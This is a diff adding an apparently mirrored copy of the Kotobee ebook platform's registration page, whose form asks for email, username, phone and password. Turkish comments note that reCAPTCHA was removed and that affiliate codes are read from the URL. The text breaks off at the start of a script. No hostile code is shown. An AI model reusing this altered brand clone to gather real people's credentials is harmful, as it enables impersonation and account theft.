@@ -1,0 +1,1312 @@
+<!DOCTYPE html><html ng-app="web.Kotobee" lang="en"><head>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="initial-scale=1, maximum-scale=6, width=device-width">
+    <meta name="keywords" content="interactive ebooks, create ebooks, ebooks, ebook creator, ebook editor, epub software, epub creator, epub reader">
+    <meta name="description" content="Kotobee is an interactive ebook creation software and digital publishing platform. Create and publish ebooks for Android, iPad, iPhone, HTML5, desktop, SCORM, LTI, and more!">
+    <meta name="copyright" content="Vijua 2025">
+    <meta name="abstract" content="Kotobee is an interactive ebook creation software and digital publishing platform. Create and publish ebooks for Android, iPad, iPhone, HTML5, desktop, SCORM, LTI, and more!">
+
+    <title>Kotobee Registration</title>
+
+            <meta property="og:title" content="Kotobee Registration">
+        <meta property="og:description" content="Kotobee is an interactive ebook creation software and digital publishing platform. Create and publish ebooks for Android, iPad, iPhone, HTML5, desktop, SCORM, LTI, and more!">
+        <meta property="og:url" content="https://www.kotobee.org/register">
+        <meta property="og:site_name" content="Kotobee">
+        <meta property="og:type" content="product">
+        <meta property="og:image" content="../img/web/logo/logo230.jpg">
+        <meta property="og:image:type" content="image/jpeg">
+        <link rel="image_src" type="image/jpeg" href="/img/web/logo/logo230.jpg">
+    
+
+
+        		<script src="../../www.google.com/recaptcha/api.js" async="" defer=""></script>
+	<style>
+		.registration {
+			min-height: 200px;
+		}
+		.registration p {
+			font-size: 18px;
+		}
+		h1.mainVertifyHeading {
+			font-family: "Muli-Bold";
+			font-size: 24px;
+			margin-top: 0;
+		}
+		p.box {
+			max-width: 600px;
+			/*background-color:#fcf8d2;
+            padding:20px 30px;*/
+			margin: 10px auto;
+			color: #707070;
+		}
+	</style>
+
+            <link rel="shortcut icon" type="image/vnd.microsoft.icon" href="../img/web/logo/favicon.ico">
+        <link rel="shortcut icon" type="image/x-icon" href="../img/web/logo/favicon.ico">
+    
+                
+    
+                        <link rel="preload" as="font" type="font/woff" crossorigin="" href="/css/fonts/fontawesome-webfont.woff">
+    <link rel="stylesheet" href="../css/styles.min_c=2565.css">
+
+    
+    <!-- Global site tag (gtag.js) -->
+    
+</head>
+
+<body ng-controller="GlobalCtrl" ng-init="init()" class="en" ng-cloak="" style="margin:0px; padding:0px">
+
+<div id="registration" class="">
+
+    <div id="globalModals" class="modal bootstrap-dialog fade type-success fade in" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true" style="display: none;">
+        <ng-include src="'/bundles/vijualib/templates/modals.html'"></ng-include>
+    </div>
+
+         
+
+ 
+ 
+
+        
+
+<div class="menu">
+    <div class="inner ">
+        <a href="/en" class="logo">
+            <img src="../img/web/logo/normal-tm.png" alt="logo">
+        </a>
+        <div class="items hidden-md hidden-sm hidden-xs">
+            <div ng-include="'templates/menu'"></div>
+        </div>
+                <a href="#" class="menuBtn visible-md-block visible-sm-block visible-xs-block" ng-click="site.showMobileMenu=!site.showMobileMenu" aria-label="Menu">
+            <span class="icon icon-menu"></span>
+        </a>
+        <div class="langSubMenu mobile visible-md-block visible-sm-block visible-xs-block" ng-include="'templates/languages'"></div>
+    </div>
+    <div class="mobileMenu visible-md-block visible-sm-block visible-xs-block" ng-if="site.showMobileMenu">
+        <div ng-include="'templates/mobileMenu'"></div>
+    </div>
+    
+</div>
+
+<div class="overlayMenu" ng-class="site.showOverlayMobileMenu?'expanded':''">
+    <div class="inner">
+        <a href="/en" class="logo">
+            <img src="../img/web/logo/normal.png" alt="logo">
+        </a>
+        <div class="items hidden-md hidden-sm hidden-xs">
+            <div ng-include="'templates/menu'"></div>
+        </div>
+                <a href="#" class="menuBtn visible-md-block visible-sm-block visible-xs-block" ng-click="site.showOverlayMobileMenu=!site.showOverlayMobileMenu" aria-label="Menu">
+            <span class="icon icon-menu"></span>
+        </a>
+        <div class="langSubMenu mobile visible-md-block visible-sm-block visible-xs-block" ng-include="'templates/languages'"></div>
+    </div>
+    <div class="mobileMenu visible-md-block visible-sm-block visible-xs-block" ng-if="site.showOverlayMobileMenu">
+        <div ng-include="'templates/mobileMenu'"></div>
+    </div>
+</div>
+
+<script type="text/ng-template" id="templates/menu">
+    <div>
+                <div class="productsSubMenu">
+            <a class="item" href="#" ng-click="toggleSubMenu($event)">Products <span class="caret"></span></a>
+            <div class="expanded">
+                <div class="col-xs-6">
+                    <div class="row">
+                        <a href="/en/products/author">
+                            <img src="/img/web/logo/author/icon.png" class="floatLeft" alt=""> 
+                            <div>
+                                <p>Kotobee Author <span class="popular">Popular</span></p>
+                                <span>Create beautiful EPUB-based interactive ebooks that run across all devices and platforms. Choose the plan that fits your needs. Start for free, upgrade anytime.</span>
+                            </div>
+                        </a>
+                        <a href="/en/products/reader">
+                            <img src="/img/web/logo/reader/icon.png" class="floatLeft" alt=""> 
+                            <div>
+                                <p>Kotobee Reader</p>
+                                <span>Download Kotobee Reader, a free ebook reader for PC & Mac. Enjoy interactive EPUBs, offline reading, and customizable settings for a personalized reading experience.</span>
+                            </div>
+                        </a>
+                        <a href="/en/miniapps">
+                            <img src="/img/web/logo/mini-apps/icon.png" class="floatLeft" alt="">
+                            <div>
+                                <p>Kotobee Mini-apps</p>
+                                <span>Add additional functionality to your ebooks through creative apps and widgets.</span>
+                            </div>
+                        </a>
+                        <a href="/en/products/narrator">
+                            <img src="/img/web/logo/narrator/icon.png" class="floatLeft" style="width:34px" alt="">
+                            <div>
+                                <p>Kotobee Narrator <span class="popular">New</span></p>
+                                <span>Create professional-quality audiobooks by compiling MP3 chapters and customizing metadata.</span>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                <div class="col-xs-6">
+                    <div class="row">
+                        <a href="/en/products/library">
+                            <img src="/img/web/logo/library/icon.png" class="floatLeft" alt="">
+                            <div>
+                                <p>Kotobee Library <span class="popular">Popular</span></p>
+                                <span>Create digital bookshelves with full user access control. Manage through a powerful control panel and API.</span>
+                            </div>
+                        </a>
+                        <a href="/en/products/cloud">
+                            <img src="/img/web/logo/cloud/icon.png" class="floatLeft" alt="">
+                            <div>
+                                <p>Kotobee Cloud</p>
+                                <span>Host your ebooks online. Create cloud ebooks with user access options and high-security ebook DRM options.</span>
+                            </div>
+                        </a>
+                        <a href="https://books.kotobee.org/">
+                            <img src="/img/web/logo/kbooks/icon.png" class="floatLeft" alt="Kotobee books">
+                            <div>
+                                <p>Kotobee Books</p>
+                                <span>Publish and sell your ebooks directly through our online ebook store, reaching readers worldwide.</span>
+                            </div>
+                        </a>
+                                            </div>
+                </div>
+            </div>
+        </div>
+        <div class="servicesSubMenu">
+            <a class="item" href="#" ng-click="toggleSubMenu($event)">Services <span class="caret"></span></a>
+            <div class="expanded">
+                <div class="col-xs-6">
+                    <div class="row">
+                        <a href="/en/services">
+                            <div>
+                                <p>Overview</p>
+                                <span>Learn about the various services provided by Kotobee.</span>
+                            </div>
+                        </a>
+                        <a href="/en/services/consultation">
+                            <div>
+                                <p>Ebook Consultation</p>
+                                <span>Consult with our experts on your ebook project.</span>
+                            </div>
+                        </a>
+                        <a href="/en/services/conversion">
+                            <div>
+                                <p>Ebook Conversion</p>
+                                <span>Convert your manuscript into any ebook format.</span>
+                            </div>
+                        </a>
+                        <a href="/en/services/marketing">
+                            <div>
+                                <p>Ebook Marketing</p>
+                                <span>Boost your ebook's visibility and captivate your audience.</span>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                <div class="col-xs-6">
+                    <div class="row">
+                        <a href="/en/services/design">
+                            <div>
+                                <p>Ebook Design</p>
+                                <span>Transform your ebook into beautiful layouts.</span>
+                            </div>
+                        </a>
+                        <a href="/en/services/scripting">
+                            <div>
+                                <p>Ebook Scripting</p>
+                                <span>Create custom interactive content for your ebook.</span>
+                            </div>
+                        </a>
+                        <a href="/en/services/publishing">
+                            <div>
+                                <p>Ebook Publishing</p>
+                                <span>Publish your ebook on major publishing platforms.</span>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="solutionsSubMenu">
+            <a class="item" href="#" ng-click="toggleSubMenu($event)">Solutions <span class="caret"></span></a>
+            <div class="expanded">
+                <div class="col-xs-6">
+                    <div class="row">
+                        <a href="/en/solutions/k12">
+                            <div>
+                                <p>K12</p>
+                                <span>Enrich your K12 students' learning experience.</span>
+                            </div>
+                        </a>
+                        <a href="/en/solutions/higher-education">
+                            <div>
+                                <p>Higher Education</p>
+                                <span>Enhance students' learning with interactive textbooks.</span>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                <div class="col-xs-6">
+                    <div class="row">
+                        <a href="/en/solutions/corporate-training">
+                            <div>
+                                <p>Corporate Training</p>
+                                <span>Create interactive training courses for your employees.</span>
+                            </div>
+                        </a>
+                        <a href="/en/solutions/digital-publishing">
+                            <div>
+                                <p>Digital Publishing</p>
+                                <span>Turn your documents into interactive digital publications.</span>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <a class="item" href="/en/pricing">Pricing</a>
+        
+        <a class="item boxed scheduleDemoBtn" href="/en/livedemo">Schedule Demo</a>
+
+        <div class="resourcesSubMenu">
+            <a class="item" href="#" ng-click="toggleSubMenu($event)">Resources <span class="caret"></span></a>
+            <div class="expanded">
+                <div class="col-xs-6">
+                    <div class="row">
+                        <a href="/en/case-studies">
+                            <div>
+                                <p>Case Studies</p>
+                                <span>Discover how institutions successfully use Kotobee for education and publishing.</span>
+                            </div>
+                        </a>
+                        <a href="/academy">
+                            <div>
+                                <p>Kotobee Academy</p>
+                                <span>Access courses and tutorials to master Kotobee's ebook creation and publishing tools.</span>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                <div class="col-xs-6">
+                    <div class="row">
+                        <a href="https://blog.kotobee.com/">
+                            <div>
+                                <p>Blog</p>
+                                <span>Stay updated with trends, insights, and tips in ebook creation, elearning, and digital publishing.</span>
+                            </div>
+                        </a>
+                        <a href="https://support.kotobee.com">
+                            <div>
+                                <p>Help Center</p>
+                                <span>Find answers and support to get the most out of Kotobee.</span>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <a class="item" href="/en/contact">Contact</a>
+        <div class="langSubMenu" ng-include="'templates/languages'"></div>
+    </div>
+ </script>
+
+
+<script type="text/ng-template" id="templates/mobileMenu">
+    <div>
+                <div class="productsSubMenu">
+            <a class="item" href="#" ng-click="toggleSubMenu($event)">Products <span class="caret"></span></a>
+            <div class="expanded">
+                <a href="/en/products/author"><img src="/img/web/logo/author/icon.png" alt=""> Kotobee Author</a>
+                <a href="/en/products/reader"><img src="/img/web/logo/reader/icon.png" alt=""> Kotobee Reader</a>
+                <a href="/en/products/cloud"><img src="/img/web/logo/cloud/icon.png" alt=""> Kotobee Cloud</a>
+                <a href="/en/products/library"><img src="/img/web/logo/library/icon.png" alt=""> Kotobee Library</a>
+                <a href="/en/miniapps"><img src="/img/web/logo/mini-apps/icon.png" alt=""> Kotobee Mini-apps</a>
+                <a href="https://books.kotobee.org/"><img src="/img/web/logo/kbooks/icon.png" alt=""> Kotobee Books</a>
+                <a href="/en/products/narrator"><img src="/img/web/logo/narrator/icon.png" style="width:34px" alt=""> Kotobee Narrator</a>
+                            </div>
+        </div>
+        <div class="servicesSubMenu">
+            <a class="item" href="#" ng-click="toggleSubMenu($event)">Services <span class="caret"></span></a>
+            <div class="expanded">
+                <a href="/en/services">Overview</a>
+                <a href="/en/services/consultation">Ebook Consultation</a>
+                <a href="/en/services/conversion">Ebook Conversion</a>
+                <a href="/en/services/design">Ebook Design</a>
+                <a href="/en/services/scripting">Ebook Scripting</a>
+                <a href="/en/services/publishing">Ebook Publishing</a>
+                <a href="/en/services/marketing">Ebook Marketing</a>
+            </div>
+        </div>
+        <div class="solutionsSubMenu">
+            <a class="item" href="#" ng-click="toggleSubMenu($event)">Solutions <span class="caret"></span></a>
+            <div class="expanded">
+                <a href="/en/solutions/k12">K12</a>
+                <a href="/en/solutions/higher-education">Higher Education</a>
+                <a href="/en/solutions/corporate-training">Corporate Training</a>
+                <a href="/en/solutions/digital-publishing">Digital Publishing</a>
+            </div>
+        </div>
+        <a class="item" href="/en/pricing">Pricing</a>
+        
+        <a class="item boxed scheduleDemoBtn" href="/en/livedemo">Schedule Demo</a>
+
+        <div class="resourcesSubMenu">
+            <a class="item" href="#" ng-click="toggleSubMenu($event)">Resources <span class="caret"></span></a>
+            <div class="expanded">
+                <a href="/en/case-studies">Case Studies</a>
+                <a href="/academy">Kotobee Academy</a>
+                <a href="https://blog.kotobee.com/">Blog</a>
+                <a href="https://support.kotobee.com">Help Center</a>
+            </div>
+        </div>
+
+        <a class="item" href="/en/contact">Contact</a>
+        <div class="langSubMenu" ng-include="'templates/languages'"></div>
+    </div>
+ </script>
+
+
+ <script type="text/ng-template" id="templates/languages">
+    <a class="item" href="#" ng-click="toggleSubMenu($event)" aria-label="Language">
+        <span class="flag-icon flag-icon-gb"></span> <span class="caret"></span>
+    </a>
+
+            
+    <div class="expanded flip">
+        <a href="/en/register" ng-class="('en'=='en')?'current':''"><span class="flag-icon flag-icon-gb"></span> English</a>
+        <a href="/fr/register" ng-class="('fr'=='en')?'current':''"><span class="flag-icon flag-icon-fr"></span> Français</a>
+        <a href="/es/register" ng-class="('es'=='en')?'current':''"><span class="flag-icon flag-icon-es"></span> Español</a>
+        <a href="/ar/register" ng-class="('ar'=='en')?'current':''"><span class="flag-icon flag-icon-sa"></span> العربية</a>
+    </div>
+ </script>
+
+<div id="livedemoPopup" xclass="popup">
+    <div class="inner">
+        <div class="customInfo">
+            <div class="langSelection">
+                <div class="forDemo selectLabel">I'd like a demo in</div>
+                <div class="forMeeting selectLabel">I'd like a meeting in</div>
+
+                <select id="inputLang" class="langs">
+                    <option value="en" selected="selected">English</option>
+                                        <option value="es">Español</option>
+                    <option value="ar">العربية</option>
+                </select>
+            </div>
+            <div class="agentSelection">
+                <div id="agentBtnContainer">
+                    <div class="btn-group" role="group">
+                        <button type="button" data-agent="ziad" class="_en _ar ziad active agentBtn btn btn-default">
+                            <img src="../img/web/livedemo/agentMale.png" alt="Muhammad">
+                            <div class="agentLabel">Agent</div>
+                            <div class="agentName">
+                                <span class="arLabel">زياد مجدي</span>
+                                <span>Ziad Magdy</span>
+                            </div>
+                            <div class="agentDesc">Different timings available</div>
+                        </button>
+                        <button type="button" data-agent="nadeen" class="_en _ar _es nadeen agentBtn btn btn-default">
+                            <img src="../img/web/livedemo/agentFemale.png" alt="Nadeen Amr">
+                            <div class="agentLabel">Agent</div>
+                            <div class="agentName">
+                                <span class="arLabel">نادين عمرو</span>
+                                <span>Nadeen Amr</span>
+                            </div>
+                            <div class="agentDesc">Different timings available</div>
+                        </button>
+                        <a href="/en/livedemo" class="_en _ar _es customTimingBtn btn btn-default">
+                            <p class="dontSuitYou">Agent timings don't suit you?</p>
+                            <span class="sendPreferredTiming">Send your preferred timing!</span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="liveDemoFrame">
+            <span class="loading">
+                <span class="icon icon-spinner icon-spin vAlignCenter"></span>
+                <div class="hSpace2"></div>
+                Loading available times
+            </span>
+            <iframe width="100%" height="100%" scrolling="no" frameborder="0"></iframe>
+        </div>
+        <a href="#" class="popupCloseBtn">Close</a>
+    </div>
+</div>    <div class="banner">
+        <h1 class="kb largeTitle">
+                    </h1>
+    </div>
+
+    
+<div class="kb section fixed">
+    <div class="kbInner">
+        <div class="vSpace20"></div>
+        <div class="registration">
+            
+	<div class="vSpace5" style="margin-top:-30px"></div>
+
+	<script type="text/javascript">
+		var name = "";
+        var email = "";
+        var lang = "en";
+        var error = "";
+        var errorDetails = "";
+	</script>
+
+	<div id="userRegister" class="" ng-controller="UserRegisterCtrl" style="opacity:0">
+
+		
+
+		<div v-if="mode=='complete'">
+			<div class="alignCenter">
+				<div class="vSpace40"></div>
+				<div class="vSpace40"></div>
+				<div>
+					<img src="../img/web/misc/emailAnimated.gif" alt="email">
+				</div>
+				<h1 class="mainVertifyHeading">
+					<span class="inlineBlock">Registration Successful!</span>
+				</h1>
+				<p class="box">
+					You have successfully registered. You can now log in with your email and password.
+				</p>
+				<div class="vSpace20"></div>
+				<p class="alignCenter">
+					<a href="../login" class="btn btn-danger btn-sm">Go to Login</a>
+				</p>
+				<div class="vSpace40"></div>
+			</div>
+		</div>
+
+		<div class="registration" v-if="mode=='register'">
+
+			<div class="alignCenter">
+				<h1 class="registerTitle">Register for your serial</h1>
+				<div class="vSpace20"></div>
+				<p>You will be emailed your free serial number instantly once you complete the registration form.</p>
+			</div>
+
+			
+<div class="footerActionBtns midpage">
+
+    <div class="actionBtns row">
+        <div class="col-xs-12">
+                        <form method="post" action="/en/register" class="form neutral" xid="home-mid-signup-form" v-bind:class="[registering?'registering':'']">
+                                <input class="emailTxt" type="email" v-bind:readonly="registering" name="email" placeholder="Email" v-on:keyup.enter="register('home-mid-signup-form',$event)">
+                <input class="phoneTxt" type="text" name="phone" placeholder="Phone">
+                <input type="hidden" name="action" value="newRedirect">
+                <input type="hidden" name="subscribe" value="true">
+                <input type="hidden" class="ref" name="ref" value="">
+                <input type="hidden" class="aff" name="aff" value="">
+                <input type="hidden" name="lang" value="en">
+                <input type="hidden" name="ssoprovider" class="ssoprovider" value="">
+                <input type="hidden" name="ssotoken" class="ssotoken" value="">
+                <input type="hidden" name="name" class="name" value="">
+                <input type="hidden" name="source" value="From home midpage author. Path: /register">
+                <div class="inlineBlock alignLeft vAlignCenter">
+                    <button v-bind:disabled="registering" class="btn btn-danger kb registerBtn" v-on:click="register('home-mid-signup-form',$event)">
+                        <span v-if="!registering" class="fa fa-arrow-circle-down availableIcon"></span>
+                        <span v-if="registering" class="fa fa-circle-o-notch fa-spin busyIcon"></span>
+                                                    Get your free license
+                                            </button>
+                                        </div>
+                <input type="submit" value="submit" class="hide">
+                
+                <div class="formFooter">
+                                            �
+                                        <div class="communicate">
+                        <button onclick="openChat(); return false;" class="inlineBlock">
+                            <span class="icon icon-chat"></span> Chat with a live agent
+                        </button>
+                        <button class="scheduleDemoBtn inlineBlock">
+                            <span class="icon icon-meeting"></span> Schedule a meeting
+                        </button>
+                    </div>
+                </div>
+
+            </form>
+            
+
+                    </div>
+    </div>
+</div>
+			<form class="registrationForm" v-on:submit="submit($event)">
+
+								<div class="userForm" xng-init="model.lang='en'">
+  <div v-if="error" class="errorAlert alert alert-danger" role="alert">
+     {[error]}
+     <div class="details" v-if="errorDetails" v-html="errorDetails">
+     </div>
+ </div>
+
+<div>
+  <div class="form-group inline">
+    <label>Email *</label>
+    <input type="email" autofocus="" name="email" v-model="model.email" class="form-control input-sm" placeholder="Email" xng-init="model.email=''">
+  </div>
+  <div class="form-group inline">
+    <label>Username *</label>
+    <input type="text" name="username" v-model="model.username" class="form-control input-sm" placeholder="Username" required xng-init="model.username=''">
+  </div>
+  <div class="form-group inline">
+    <label>Personal Name </label>
+    <input type="text" name="name" v-model="model.name" class="form-control input-sm" placeholder="Personal Name" xng-init="model.name=''">
+  </div>
+  <div class="form-group phone">
+    <label>Phone *</label>
+    <input type="text" name="phone" v-model="model.phone" class="form-control input-sm" placeholder="Phone">
+  </div>
+  <div class="form-group inline">
+    <label>Affiliate Code </label>
+    <input type="text" name="affiliate" id="affiliateCode" v-model="model.affiliate" class="form-control input-sm" placeholder="Affiliate Code">
+  </div>
+  <div class="form-group inline">
+    <label>Password *</label>
+    <input type="password" name="password" v-model="model.password" class="form-control input-sm" placeholder="Password" required>
+  </div>
+  <div class="form-group inline">
+    <label>Confirm Password *</label>
+    <input type="password" name="confirmPassword" v-model="model.confirmPassword" class="form-control input-sm" placeholder="Confirm Password" required>
+  </div>
+
+</div>
+
+<div v-if="!ad">
+<div>
+    <div>
+        <div class="form-group dropdown inline">
+            <label>How did you hear about us? </label>
+            <div>
+                <dropdown>
+                  <button class="btn btn-default xbtn-sm dropdown-toggle" type="button" id="dropdownMenu2" data-toggle="dropdown" aria-expanded="true">
+                    {[model.heard?model.heard:'Please select']}
+                    <span class="caret"></span>
+                  </button>
+                  <ul class="dropdown-menu" role="menu" aria-labelledby="dropdownMenu2">
+                    <li role="presentation" v-for="count in ['Google search','YouTube video','Online advertisement','Social media','Forum or blog','Newspaper of magazine','From a mobile app','Recommended by a friend','Other']"><a role="menuitem" tabindex="-1" href="" v-on:click.prevent="model.heard=count">{[count]}</a></li>
+                  </ul>
+                </dropdown>
+            </div>
+        </div>
+        <div class="form-group dropdown inline" xng-init="model.employees = '1'">
+            <label>Number of Employees </label>
+            <div>
+                <dropdown>
+                  <button class="btn btn-default xbtn-sm dropdown-toggle" type="button" id="dropdownMenu1" data-toggle="dropdown" aria-expanded="true">
+                    {[model.employees]}
+                    <span class="caret"></span>
+                  </button>
+                  <ul class="dropdown-menu" role="menu" aria-labelledby="dropdownMenu1">
+                    <li role="presentation" v-for="count in ['1','2-5','6-20','21-100','> 100']"><a role="menuitem" tabindex="-1" href="" v-on:click.prevent="model.employees=count">{[count]}</a></li>
+                  </ul>
+                </dropdown>
+            </div>
+        </div>
+        <input type="hidden" name="employees" v-model="model.employees">
+        <input type="hidden" name="heard" v-model="model.heard">
+    </div>
+    <div class="form-group">
+        <label>Description of usage </label>
+        <textarea name="description" class="form-control input-sm" v-model="model.description" rows="3"></textarea>
+    </div>
+</div>
+  <!-- reCAPTCHA kaldırıldı - basit sistem için gerekli değil -->
+  <!-- <div class="form-group">
+          <div>
+                   <div class="g-recaptcha" data-sitekey="6Ld8WhETAAAAAFmztXiqyvb_zoALi3PnmyBiiCHj"></div>
+                                  </div>
+  </div> -->
+
+  <input type="hidden" name="lang" v-model="model.lang">
+  <input type="hidden" name="ref" class="ref" value="">
+  <input type="hidden" name="aff" class="aff" value="">
+
+</div>				<div class="vSpace20"></div>
+
+				<p class="alignCenter">
+					<button v-if="!busy" type="submit" class="btn btn-sm btn-danger button">Register</button>
+					<button v-if="busy" type="submit" v-bind:disabled="true" class="btn btn-sm btn-danger button">Please wait
+						<span v-if="busy" class="fa fa-circle-o-notch fa-spin"></span>
+					</button>
+				</p>
+
+			</form>
+		</div>
+	</div>
+        </div>
+    </div>
+</div>
+<div class="vSpace40"></div>
+<div class="vSpace40"></div>
+<div class="vSpace40"></div>
+
+    
+<div class="kb section spread lightGray halfWide">
+    <div class="kbInner">
+        <div class="row">
+        </div>
+        <a id="newsletter"></a>
+        <div class="footerMenu row">
+            <div class="links-wrapper">
+                <div class="link-col col-one">
+                    <h4>Resources</h4>
+                    <a href="https://blog.kotobee.com/how-create-interactive-ebook-guide/">How to Create an Interactive Ebook</a>
+                    <a href="https://blog.kotobee.com/edit-epub-books-manually/">How to Edit EPUB Books Manually</a>
+                    <a href="https://blog.kotobee.com/ebook-drm-security-what-how/">Ebook DRM & Security</a>
+                    <a href="https://blog.kotobee.com/5-steps-pdf-to-interactive-ebook/">Convert Your PDF to an Interactive Ebook</a>
+                    <a href="https://blog.kotobee.com/ebook-apps/">Turn Your Book into an Ebook App</a>
+                    <a href="https://blog.kotobee.com/ebook-formats/">Ebook Formats Explained for Beginners</a>
+                    <a href="https://blog.kotobee.com/best-ebook-layout-reflowable-fixed/">Best Ebook Layout Format: Reflowable or Fixed?</a>
+                    <h4>Free Tools</h4>
+                    <a href="https://www.kotobee.org/convert">PDF to URL Converter</a>
+                </div>
+                <div class="link-col col-two">
+                    <h4>Programs</h4>
+                    <a href="/en/affiliates">Kotobee Affiliate Program</a>
+                    <a href="/en/invite">Invite Friends to Kotobee</a>
+                    <a href="https://www.kotobee.org/kotobee-ebook-contest-2020">Contests</a>
+                                            <a href="/en/ebook-publishing-basics-course">Ebook Courses</a>
+                                        <h4>Support</h4>
+                    <a href="https://support.kotobee.com/en/support/solutions/articles/8000027851-quick-guide">Getting Started with Kotobee</a>
+                    <a href="/academy">Kotobee Academy</a>
+                    <a href="/en/contact">Contact Us</a>
+                    <a href="/en/livedemo">Request a Demo</a>
+                    <a href="https://support.kotobee.com">Help Center</a>
+                </div>
+                <div class="link-col two-three">
+                    <h4>Company</h4>
+                    <a href="https://www.vijua.com/about">About Us</a>
+                    <a href="https://www.kotobee.org/awards">Awards</a>
+                    <a href="https://www.kotobee.org/privacy">Privacy Policy</a>
+                    <a href="https://kotobee.statuspage.io/">System Status</a>
+                    <a href="https://www.kotobee.org/advertise">Advertise with Us</a>
+                    <h4>Solutions</h4>
+                    <a href="/en/solutions/k12">K12 Education</a>
+                    <a href="/en/solutions/higher-education">Higher Education</a>
+                    <a href="/en/solutions/digital-publishing">Digital Publishing</a>
+                    <a href="/en/solutions/corporate-training">Corporate Training</a>
+                </div>
+                <div class="link-col cole-four">
+                    <h4>Quick Links</h4>
+                    <a href="https://blog.kotobee.com/">Blog</a>
+                    <a href="/en/case-studies">Case Studies</a>
+                    <a href="https://www.kotobee.org/mediakit">Press Kit</a>
+                    <a href="/en/customers">Customers</a>
+                                        <a href="/en/pricing">Pricing</a>
+                </div>
+            </div>
+            <div class="clear"></div>
+            <hr>
+            <div class="bottomFooterContainer">
+                                    
+<div class="col-sm-5 newsletterContainer">
+  <h4>Subscribe for news and updates</h4>
+  <form class="newsletterForm" data-list="5815013">
+    <div class="form-group ml-field-email ml-validate-required ml-validate-email">
+      <input type="email" name="fields[email]" class="emailInput form-control" placeholder="Email*">
+    </div>
+    <button type="submit" class="submitBtn primary">
+        <img width="19" height="14" src="../img/web/footer/messge.png" alt="Send">
+    </button>
+  </form>
+    <div class="subscribeError">
+        <h3>error</h3>
+        <p>Please check your email and try again or <a href="https://support.kotobee.com">contact support</a>.</p>
+    </div>
+    <div class="subscribeSuccess">
+        <h3>Thank you for subscribing!</h3>
+        <p>You should start receiving emails instantly.</p>
+    </div>
+  <p>
+    Submit your email address to receive a weekly newsletter containing tips and updates. Unsubscribe from our emails at any time.
+  </p>
+</div> 
+
+                <div class="col-sm-5 footerSocial text-center">
+                    <h3>Follow us</h3>
+                    <a href="https://www.facebook.com/kotobee" target="_blank" aria-label="Facebook">
+                        <img src="../img/web/footer/facebook.png" width="24" height="24" alt="Facebook">
+                    </a>
+                    <a href="https://twitter.com/kotobee" target="_blank" aria-label="Twitter">
+                        <img src="../img/web/footer/twitter.png" width="24" height="24" alt="Twitter">
+                    </a>
+                    <a href="https://www.linkedin.com/company/kotobee/" target="_blank" aria-label="LinkedIn">
+                        <img src="../img/web/footer/linkedIn.png" width="24" height="24" alt="LinkedIn">
+                    </a>
+                    <a href="https://www.youtube.com/c/Kotobee" target="_blank" aria-label="YouTube">
+                        <img src="../img/web/footer/youtube.png" width="24" height="24" alt="YouTube">
+                    </a>
+                    <p>
+                        <a href="/cdn-cgi/l/email-protection#b8d1d6ded7f8ced1d2cdd996dbd7d5">
+                            <span class="__cf_email__" data-cfemail="335a5d555c73455a5946521d505c5e">[email�protected]</span>
+                        </a>
+                    </p>
+                </div>
+                <div class="col-sm-5 footerAwards text-center">
+                    <a href="/en/awards" aria-label="Awards">
+                        <img src="../img/web/footer/qualityChoice.png" width="77" height="77" alt="Quality Choice">
+                        <img src="../img/web/footer/bestValue.png" width="102" height="101" alt="Best Value">
+                        <img src="../img/web/footer/excellent.png" width="76" height="77" alt="Excellent Support">
+                        <img src="../img/web/footer/witsa.png" width="94" height="78" alt="WITSA">
+                    </a>
+                </div>
+            </div>
+            <div class="copyrights text-center">
+                <p>Copyright © 2025 <a href="https://vijua.com/" target="_blank">Vijua</a></p>
+                            </div>
+            
+                                                                                                                                                                                
+                                                                                                                                        
+                    
+                    
+                    
+                                       
+        </div>
+    </div>
+
+ <!-- FreshChat Code -->
+<script data-cfasync="false" src="../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+      function initFreshChat() {
+        window.fcWidget.init({
+          token: "7692d0ce-eba9-45ca-97a5-2d21c0d07124",
+          host: "https://wchat.freshchat.com"
+        });
+      }
+      function initialize(i,t){var e;i.getElementById(t)?initFreshChat():((e=i.createElement("script")).id=t,e.async=!0,e.src="https://wchat.freshchat.com/js/widget.js",e.onload=initFreshChat,i.head.appendChild(e))}function initiateCall(){initialize(document,"freshchat-js-sdk")};
+</script></div>
+
+
+</div>
+
+
+
+<script type="text/javascript">
+_linkedin_data_partner_id = "17896";
+</script><script type="text/javascript">
+(function(){var s = document.getElementsByTagName("script")[0];
+var b = document.createElement("script");
+b.type = "text/javascript";b.async = true;
+b.src = "https://snap.licdn.com/li.lms-analytics/insight.min.js";
+s.parentNode.insertBefore(b, s);})();
+</script>
+
+
+ <!-- Facebook Pixel Code -->
+        <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=597011190465103&ev=PageView&noscript=1"
+    /></noscript>
+<!-- End Facebook Pixel Code -->
+
+
+
+	<script>
+		var errorOb = {
+    serverConnection: "Error\u0020connecting\u0020with\u0020server.\u0020Please\u0020try\u0020again.",
+    fillAllFields: "Please\u0020fill\u0020in\u0020all\u0020the\u0020fields.",
+    agreeToTerms: "Please\u0020agree\u0020to\u0020the\u0020terms\u0020before\u0020registering.",
+    selectCaptcha: "You\u0020need\u0020to\u0020select\u0020the\u0020captcha\u0020checkbox.",
+    cantFindUser: "Sorry,\u0020we\u0020can\u0027t\u0020find\u0020your\u0020account.\u0020Please\u0020check\u0020and\u0020try\u0020again.",
+    emailEmpty: "Please\u0020enter\u0020an\u0020email\u0020address.",
+    emailValidationError: "Please\u0020check\u0020the\u0020email\u0020formatting\u0020and\u0020try\u0020again.",
+    emailDuplicate: "This\u0020email\u0020address\u0020has\u0020already\u0020been\u0020entered.",
+    d_connectionTimedOut: "Invalid email or password. Please check your credentials and try again."
+}    </script>
+	<script>
+		// URL'den affiliate kodunu oku ve input'a doldur
+		(function() {
